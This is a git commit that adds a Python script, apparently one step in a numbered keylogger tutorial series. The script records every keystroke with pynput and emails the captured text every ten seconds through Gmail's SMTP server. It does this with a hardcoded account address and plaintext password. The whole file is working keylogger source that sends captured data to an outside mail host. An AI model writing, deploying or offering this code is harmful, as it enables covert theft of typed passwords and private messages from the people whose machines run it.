ea19b5273f54af241828deac3151b2959b41cfa8
vaibhav <vaibhavpaliwal620@gmail.com>
2022-01-04 22:07:58 +0530

    sending report added

---
+++ 4_sending_report.py
@@ -0,0 +1,35 @@
+import pynput.keyboard
+import threading
+import smtplib
+
+email = "jhnsnw32@gmail.com"
+password = "Abc123Abc12"
+
+content = ""
+def process_key_strike(key):
+    global content
+    try:
+        content = content + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            content = content + " "
+        else:
+            content = content + " " + str(key) + " "
+
+def report():
+    global content, email, password
+    send_mail(email, password, content)
+    content = ""
+    timer = threading.Timer(10, report)
+    timer.start()
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+
+my_listener = pynput.keyboard.Listener(on_press=process_key_strike)
+with my_listener:
+    report()
+    my_listener.join()
